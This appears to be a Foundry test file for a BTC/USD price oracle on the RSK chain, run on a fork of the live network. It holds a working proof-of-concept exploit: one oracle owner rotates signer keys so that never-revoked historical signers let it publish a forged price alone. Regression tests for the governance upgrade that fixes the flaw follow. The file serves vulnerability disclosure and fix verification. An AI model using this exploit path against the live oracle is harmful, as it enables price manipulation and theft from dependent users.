// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { CoinPairPriceUpgradeProposal, IUpgradeDelegator } from "../changers/coin_pair_price_upgrade/CoinPairPriceUpgradeProposal.sol";
import { IChangeContract } from "../interfaces/IChangeContract.sol";
import { IGovernor } from "../interfaces/IGovernor.sol";

interface Vm {
  function addr(uint256 privateKey) external returns (address keyAddr);
  function createSelectFork(
    string calldata urlOrAlias,
    uint256 blockNumber
  ) external returns (uint256);
  function label(address account, string calldata newLabel) external;
  function prank(address msgSender) external;
  function sign(
    uint256 privateKey,
    bytes32 digest
  ) external returns (uint8 v, bytes32 r, bytes32 s);
  function load(address target, bytes32 slot) external view returns (bytes32 data);
  function getCode(string calldata artifactPath) external returns (bytes memory bytecode);
  function expectRevert() external;
  function expectRevert(bytes calldata revertData) external;
}

interface IGoverned {
  function governor() external view returns (address);
}

interface IOwnableLike {
  function owner() external view returns (address);
}

interface ICoinPairPrice {
  function getCoinPair() external view returns (bytes32);
  function getMinOraclesPerRound() external view returns (uint256);
  function getOracleManager() external view returns (address);
  function getPriceInfo() external view returns (uint256 price, bool isValid, uint256 lastPubBlock);
  function getRoundInfo()
    external
    view
    returns (
      uint256 round,
      uint256 startBlock,
      uint256 lockPeriodTimestamp,
      uint256 totalPoints,
      address[] memory selectedOwners,
      address[] memory selectedOracles
    );
  function publishPrice(
    uint256 version,
    bytes32 coinpair,
    uint256 price,
    address votedOracle,
    uint256 blockNumber,
    uint8[] calldata sigV,
    bytes32[] calldata sigR,
    bytes32[] calldata sigS
  ) external;
}

interface IOracleManager {
  function getOracleAddress(address oracleOwnerAddr) external view returns (address oracleAddr);
  function getOracleOwner(address oracleAddr) external view returns (address oracleOwnerAddr);
  function getStakingContract() external view returns (address staking);
}

interface IStaking {
  function setOracleAddress(address oracleAddr) external;
}

contract BtcUsdOracleHistoricalSignerBypassTest {
  Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

  ICoinPairPrice internal constant BTCUSD_FEED =
    ICoinPairPrice(0xa288319eCb63301e21963E21EF3Ca8fb720d2672);

  uint256 internal constant FORK_BLOCK = 8_735_658;
  uint256 internal constant PUBLISH_MESSAGE_VERSION = 3;

  struct SignerMaterial {
    address signer;
    uint8 v;
    bytes32 r;
    bytes32 s;
  }

  // BTCUSD CoinPairPrice proxy used in existing repo fork tests
  address internal constant COIN_PAIR_PRICE_PROXY = 0xa288319eCb63301e21963E21EF3Ca8fb720d2672;
  address internal constant UPGRADE_DELEGATOR = 0x131564703310a294C1bFDC09D10EC0659f18E253;

  // EIP-1967 slots (used by AdminUpgradeabilityProxy / Transparent proxies)
  bytes32 internal constant IMPLEMENTATION_SLOT =
    0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
  bytes32 internal constant ADMIN_SLOT =
    0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

  function testHistoricalSignerAccumulationCanSingleHandedlyPublishPrice() public {
    vm.createSelectFork("https://public-node.rsk.co", FORK_BLOCK);

    IOracleManager oracleManager = IOracleManager(BTCUSD_FEED.getOracleManager());
    IStaking staking = IStaking(oracleManager.getStakingContract());

    (uint256 round, , , , address[] memory selectedOwners, ) = BTCUSD_FEED.getRoundInfo();

    require(round == 62, "unexpected round");
    require(selectedOwners.length == 7, "unexpected selected owner count");
    require(BTCUSD_FEED.getMinOraclesPerRound() == 3, "unexpected min oracles");

    address owner = selectedOwners[0];
    address originalSigner = oracleManager.getOracleAddress(owner);
    require(originalSigner != address(0), "owner has no signer");

    vm.label(owner, "selectedOwner");
    vm.label(originalSigner, "originalSigner");

    uint256[4] memory privateKeys = [uint256(0xB001), 0xB002, 0xB003, 0xB004];
    address[] memory newSigners = _rotateSignersForOwner(
      owner,
      _toDynamic(privateKeys),
      oracleManager,
      staking,
      true
    );

    require(oracleManager.getOracleAddress(owner) == newSigners[3], "latest signer not active");

    // The bug: historical signer mappings were never revoked.
    require(oracleManager.getOracleOwner(originalSigner) == owner, "original signer was revoked");
    require(
      oracleManager.getOracleOwner(newSigners[0]) == owner,
      "historical signer 0 was revoked"
    );
    require(
      oracleManager.getOracleOwner(newSigners[1]) == owner,
      "historical signer 1 was revoked"
    );
    require(
      oracleManager.getOracleOwner(newSigners[2]) == owner,
      "historical signer 2 was revoked"
    );
    require(oracleManager.getOracleOwner(newSigners[3]) == owner, "current signer missing");

    (uint256 currentPrice, bool isValid, uint256 lastPubBlock) = BTCUSD_FEED.getPriceInfo();
    require(isValid, "btc price invalid before exploit");

    bytes32 coinpair = BTCUSD_FEED.getCoinPair();
    uint256 forgedPrice = currentPrice + 123456789;
    address votedOracle = newSigners[3];

    bytes32 digest = _buildDigest(coinpair, forgedPrice, votedOracle, lastPubBlock);
    (uint8[] memory sigV, bytes32[] memory sigR, bytes32[] memory sigS) = _buildSortedSignatures(
      _toDynamic(privateKeys),
      newSigners,
      digest
    );

    // A single selected owner now satisfies the live round majority threshold:
    // round length = 7, so validSigs must be > 3.
    vm.prank(votedOracle);
    BTCUSD_FEED.publishPrice(
      PUBLISH_MESSAGE_VERSION,
      coinpair,
      forgedPrice,
      votedOracle,
      lastPubBlock,
      sigV,
      sigR,
      sigS
    );

    (uint256 updatedPrice, , uint256 updatedLastPubBlock) = BTCUSD_FEED.getPriceInfo();
    require(updatedPrice == forgedPrice, "forged price was not accepted");
    require(updatedLastPubBlock == block.number, "publication block not updated");
  }

  function testFork_ExecuteChangerAsGovernorOwner() public {
    vm.createSelectFork("https://public-node.rsk.co", FORK_BLOCK);

    address oracleManagerProxy = BTCUSD_FEED.getOracleManager();
    address currentCoinPairImplementation = _loadAddress(
      COIN_PAIR_PRICE_PROXY,
      IMPLEMENTATION_SLOT
    );
    address currentOracleManagerImplementation = _loadAddress(
      oracleManagerProxy,
      IMPLEMENTATION_SLOT
    );

    _executeChanger();

    address coinPairImplementationAfter = _loadAddress(COIN_PAIR_PRICE_PROXY, IMPLEMENTATION_SLOT);
    address oracleManagerImplementationAfter = _loadAddress(
      oracleManagerProxy,
      IMPLEMENTATION_SLOT
    );
    require(
      coinPairImplementationAfter != currentCoinPairImplementation,
      "coin pair implementation was not upgraded"
    );
    require(
      oracleManagerImplementationAfter != currentOracleManagerImplementation,
      "oracle manager implementation was not upgraded"
    );
  }

  function testAfterChanger_RotationRevokesPreviousSigner() public {
    vm.createSelectFork("https://public-node.rsk.co", FORK_BLOCK);
    _executeChanger();

    IOracleManager oracleManager = IOracleManager(BTCUSD_FEED.getOracleManager());
    IStaking staking = IStaking(oracleManager.getStakingContract());
    (, , , , address[] memory selectedOwners, ) = BTCUSD_FEED.getRoundInfo();

    address owner = selectedOwners[0];
    address previousSigner = oracleManager.getOracleAddress(owner);
    address nextSigner = vm.addr(0xC001);

    vm.prank(owner);
    staking.setOracleAddress(nextSigner);

    require(oracleManager.getOracleAddress(owner) == nextSigner, "latest signer not active");
    require(
      oracleManager.getOracleOwner(previousSigner) == address(0),
      "previous signer still resolves to owner"
    );
    require(
      oracleManager.getOracleOwner(nextSigner) == owner,
      "new signer does not resolve to owner"
    );
  }

  function testAfterChanger_SingleOwnerCannotForgeMajorityWithHistoricalSigners() public {
    vm.createSelectFork("https://public-node.rsk.co", FORK_BLOCK);
    _executeChanger();

    IOracleManager oracleManager = IOracleManager(BTCUSD_FEED.getOracleManager());
    IStaking staking = IStaking(oracleManager.getStakingContract());
    (, , , , address[] memory selectedOwners, ) = BTCUSD_FEED.getRoundInfo();

    address owner = selectedOwners[0];
    address originalSigner = oracleManager.getOracleAddress(owner);

    uint256[4] memory privateKeys = [uint256(0xD001), 0xD002, 0xD003, 0xD004];
    address[] memory newSigners = _rotateSignersForOwner(
      owner,
      _toDynamic(privateKeys),
      oracleManager,
      staking,
      false
    );

    require(
      oracleManager.getOracleAddress(owner) == newSigners[3],
      "latest signer not active after rotation"
    );
    require(
      oracleManager.getOracleOwner(originalSigner) == address(0),
      "original signer still active"
    );
    require(
      oracleManager.getOracleOwner(newSigners[0]) == address(0),
      "historical signer 0 still active"
    );
    require(
      oracleManager.getOracleOwner(newSigners[1]) == address(0),
      "historical signer 1 still active"
    );
    require(
      oracleManager.getOracleOwner(newSigners[2]) == address(0),
      "historical signer 2 still active"
    );
    require(oracleManager.getOracleOwner(newSigners[3]) == owner, "current signer missing");

    (uint256 currentPrice, bool isValid, uint256 lastPubBlock) = BTCUSD_FEED.getPriceInfo();
    require(isValid, "btc price invalid before attempt");

    bytes32 coinpair = BTCUSD_FEED.getCoinPair();
    uint256 forgedPrice = currentPrice + 987654321;
    address votedOracle = newSigners[3];

    bytes32 digest = _buildDigest(coinpair, forgedPrice, votedOracle, lastPubBlock);
    (uint8[] memory sigV, bytes32[] memory sigR, bytes32[] memory sigS) = _buildSortedSignatures(
      _toDynamic(privateKeys),
      newSigners,
      digest
    );

    vm.expectRevert(bytes("Valid signatures count must exceed 50% of active oracles"));
    vm.prank(votedOracle);
    BTCUSD_FEED.publishPrice(
      PUBLISH_MESSAGE_VERSION,
      coinpair,
      forgedPrice,
      votedOracle,
      lastPubBlock,
      sigV,
      sigR,
      sigS
    );
  }

  function testAfterChanger_PreExistingHistoricalSignersRevertAsDuplicateOwner() public {
    vm.createSelectFork("https://public-node.rsk.co", FORK_BLOCK);

    IOracleManager oracleManager = IOracleManager(BTCUSD_FEED.getOracleManager());
    IStaking staking = IStaking(oracleManager.getStakingContract());
    (, , , , address[] memory selectedOwners, ) = BTCUSD_FEED.getRoundInfo();

    address owner = selectedOwners[0];
    uint256[2] memory privateKeys = [uint256(0xE001), 0xE002];
    address[] memory historicalSigners = _rotateSignersForOwner(
      owner,
      _toDynamic(privateKeys),
      oracleManager,
      staking,
      false
    );

    _executeChanger();

    (uint256 currentPrice, bool isValid, uint256 lastPubBlock) = BTCUSD_FEED.getPriceInfo();
    require(isValid, "btc price invalid before attempt");

    bytes32 coinpair = BTCUSD_FEED.getCoinPair();
    uint256 forgedPrice = currentPrice + 111111;
    address votedOracle = historicalSigners[1];

    bytes32 digest = _buildDigest(coinpair, forgedPrice, votedOracle, lastPubBlock);
    (uint8[] memory sigV, bytes32[] memory sigR, bytes32[] memory sigS) = _buildSortedSignatures(
      _toDynamic(privateKeys),
      historicalSigners,
      digest
    );

    vm.expectRevert(bytes("Oracle owner already signed"));
    vm.prank(votedOracle);
    BTCUSD_FEED.publishPrice(
      PUBLISH_MESSAGE_VERSION,
      coinpair,
      forgedPrice,
      votedOracle,
      lastPubBlock,
      sigV,
      sigR,
      sigS
    );
  }

  function testAfterChanger_MajorityDistinctOwnersCanPublishPrice() public {
    vm.createSelectFork("https://public-node.rsk.co", FORK_BLOCK);
    _executeChanger();

    IOracleManager oracleManager = IOracleManager(BTCUSD_FEED.getOracleManager());
    IStaking staking = IStaking(oracleManager.getStakingContract());
    (, , , , address[] memory selectedOwners, ) = BTCUSD_FEED.getRoundInfo();
    require(selectedOwners.length == 7, "unexpected selected owner count");

    // Build a real 4/7 majority using 4 different selected owners.
    uint256[4] memory privateKeys = [uint256(0xF001), 0xF002, 0xF003, 0xF004];
    address[] memory majoritySigners = _rotateSignersForOwners(
      selectedOwners,
      _toDynamic(privateKeys),
      oracleManager,
      staking
    );

    (uint256 currentPrice, bool isValid, uint256 lastPubBlock) = BTCUSD_FEED.getPriceInfo();
    require(isValid, "btc price invalid before publish");

    bytes32 coinpair = BTCUSD_FEED.getCoinPair();
    uint256 forgedPrice = currentPrice + 222222;
    address votedOracle = majoritySigners[0];

    bytes32 digest = _buildDigest(coinpair, forgedPrice, votedOracle, lastPubBlock);
    (uint8[] memory sigV, bytes32[] memory sigR, bytes32[] memory sigS) = _buildSortedSignatures(
      _toDynamic(privateKeys),
      majoritySigners,
      digest
    );

    vm.prank(votedOracle);
    BTCUSD_FEED.publishPrice(
      PUBLISH_MESSAGE_VERSION,
      coinpair,
      forgedPrice,
      votedOracle,
      lastPubBlock,
      sigV,
      sigR,
      sigS
    );

    (uint256 updatedPrice, , uint256 updatedLastPubBlock) = BTCUSD_FEED.getPriceInfo();
    require(updatedPrice == forgedPrice, "price was not updated");
    require(updatedLastPubBlock == block.number, "publication block not updated");
  }

  function _sortBySigner(SignerMaterial[] memory materials) internal pure {
    for (uint256 i = 0; i < materials.length; i++) {
      for (uint256 j = i + 1; j < materials.length; j++) {
        if (uint160(materials[j].signer) < uint160(materials[i].signer)) {
          SignerMaterial memory tmp = materials[i];
          materials[i] = materials[j];
          materials[j] = tmp;
        }
      }
    }
  }

  function _toDynamic(uint256[4] memory input) internal pure returns (uint256[] memory output) {
    output = new uint256[](4);
    for (uint256 i = 0; i < output.length; i++) {
      output[i] = input[i];
    }
  }

  function _toDynamic(uint256[2] memory input) internal pure returns (uint256[] memory output) {
    output = new uint256[](2);
    for (uint256 i = 0; i < output.length; i++) {
      output[i] = input[i];
    }
  }

  function _rotationSignersFromKeys(
    uint256[] memory privateKeys
  ) internal returns (address[] memory signers) {
    signers = new address[](privateKeys.length);
    for (uint256 i = 0; i < privateKeys.length; i++) {
      signers[i] = vm.addr(privateKeys[i]);
    }
  }

  function _rotateSignersForOwner(
    address owner,
    uint256[] memory privateKeys,
    IOracleManager oracleManager,
    IStaking staking,
    bool requireFresh
  ) internal returns (address[] memory signers) {
    signers = _rotationSignersFromKeys(privateKeys);
    for (uint256 i = 0; i < signers.length; i++) {
      if (requireFresh) {
        require(
          oracleManager.getOracleOwner(signers[i]) == address(0),
          "fresh signer already registered"
        );
      }
      vm.prank(owner);
      staking.setOracleAddress(signers[i]);
      require(oracleManager.getOracleOwner(signers[i]) == owner, "new signer not linked");
    }
  }

  function _rotateSignersForOwners(
    address[] memory owners,
    uint256[] memory privateKeys,
    IOracleManager oracleManager,
    IStaking staking
  ) internal returns (address[] memory signers) {
    require(owners.length >= privateKeys.length, "not enough selected owners");
    signers = _rotationSignersFromKeys(privateKeys);
    for (uint256 i = 0; i < signers.length; i++) {
      vm.prank(owners[i]);
      staking.setOracleAddress(signers[i]);
      require(
        oracleManager.getOracleAddress(owners[i]) == signers[i],
        "failed to set majority signer"
      );
      require(oracleManager.getOracleOwner(signers[i]) == owners[i], "signer owner mismatch");
    }
  }

  function _buildDigest(
    bytes32 coinpair,
    uint256 price,
    address votedOracle,
    uint256 lastPubBlock
  ) internal pure returns (bytes32) {
    return
      keccak256(
        abi.encodePacked(
          "\x19Ethereum Signed Message:\n148",
          uint256(PUBLISH_MESSAGE_VERSION),
          coinpair,
          price,
          votedOracle,
          lastPubBlock
        )
      );
  }

  function _buildSortedSignatures(
    uint256[] memory privateKeys,
    address[] memory signers,
    bytes32 digest
  ) internal returns (uint8[] memory sigV, bytes32[] memory sigR, bytes32[] memory sigS) {
    require(privateKeys.length == signers.length, "private key/signer length mismatch");

    SignerMaterial[] memory materials = new SignerMaterial[](privateKeys.length);
    for (uint256 i = 0; i < privateKeys.length; i++) {
      materials[i] = _signMaterial(privateKeys[i], signers[i], digest);
    }

    _sortBySigner(materials);
    sigV = new uint8[](materials.length);
    sigR = new bytes32[](materials.length);
    sigS = new bytes32[](materials.length);
    for (uint256 i = 0; i < materials.length; i++) {
      sigV[i] = materials[i].v;
      sigR[i] = materials[i].r;
      sigS[i] = materials[i].s;
    }
  }

  function _signMaterial(
    uint256 privateKey,
    address signer,
    bytes32 digest
  ) internal returns (SignerMaterial memory material) {
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
    material = SignerMaterial({ signer: signer, v: v, r: r, s: s });
  }

  function _loadAddress(address target, bytes32 slot) internal view returns (address) {
    bytes32 value = vm.load(target, slot);
    return address(uint160(uint256(value)));
  }

  function _executeChanger() internal {
    address governorAddr = IGoverned(COIN_PAIR_PRICE_PROXY).governor();
    address governorOwner = IOwnableLike(governorAddr).owner();
    address oracleManagerProxy = BTCUSD_FEED.getOracleManager();
    address newCoinPairPriceImplementation = _deployRealCoinPairPriceImplementation();
    address newOracleManagerImplementation = _deployRealOracleManagerImplementation();
    CoinPairPriceUpgradeProposal proposal = new CoinPairPriceUpgradeProposal(
      COIN_PAIR_PRICE_PROXY,
      oracleManagerProxy,
      IUpgradeDelegator(UPGRADE_DELEGATOR),
      newCoinPairPriceImplementation,
      newOracleManagerImplementation
    );

    vm.prank(governorOwner);
    IGovernor(governorAddr).executeChange(IChangeContract(address(proposal)));
  }

  function _deployRealCoinPairPriceImplementation()
    internal
    returns (address deployedImplementation)
  {
    bytes memory coinPairPriceCreationCode = vm.getCode(
      "contracts/compat/DeployableCoinPairPrice.sol:DeployableCoinPairPrice"
    );
    deployedImplementation = _deployContract(coinPairPriceCreationCode);
    require(deployedImplementation != address(0), "coin pair implementation deploy failed");
  }

  function _deployRealOracleManagerImplementation()
    internal
    returns (address deployedImplementation)
  {
    bytes memory oracleManagerCreationCode = vm.getCode(
      "contracts/compat/DeployableOracleManager.sol:DeployableOracleManager"
    );
    deployedImplementation = _deployContract(oracleManagerCreationCode);
    require(deployedImplementation != address(0), "oracle manager implementation deploy failed");
  }

  function _deployContract(bytes memory creationCode) internal returns (address deployed) {
    require(creationCode.length > 0, "empty creation code");
    assembly {
      deployed := create(0, add(creationCode, 0x20), mload(creationCode))
    }
    require(deployed != address(0), "create failed");
  }
}
